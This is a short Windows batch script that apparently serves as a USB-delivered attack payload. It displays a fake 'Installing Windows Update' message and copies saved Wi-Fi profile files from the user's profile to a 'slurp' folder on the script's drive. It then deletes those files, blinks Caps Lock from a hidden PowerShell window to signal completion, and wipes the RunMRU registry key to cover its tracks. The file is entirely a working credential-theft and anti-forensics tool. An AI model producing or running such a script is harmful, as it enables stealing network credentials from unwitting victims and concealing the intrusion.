@echo off
@echo Installing Windows Update

REM Creates directory compromised of computer name, date and time
REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obvious
set dst=%~d0\slurp\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
mkdir %dst% >>nul

if Exist %USERPROFILE%\wprofiles (
xcopy /C /Q /G /Y /S %USERPROFILE%\wprofiles\*.xml %dst% >>nul
del %USERPROFILE%\wprofiles\Wi-Fi-*.xml
rmdir %USERPROFILE%\wprofiles
)

REM Blink CAPSLOCK key
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"

REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

@cls
@exit
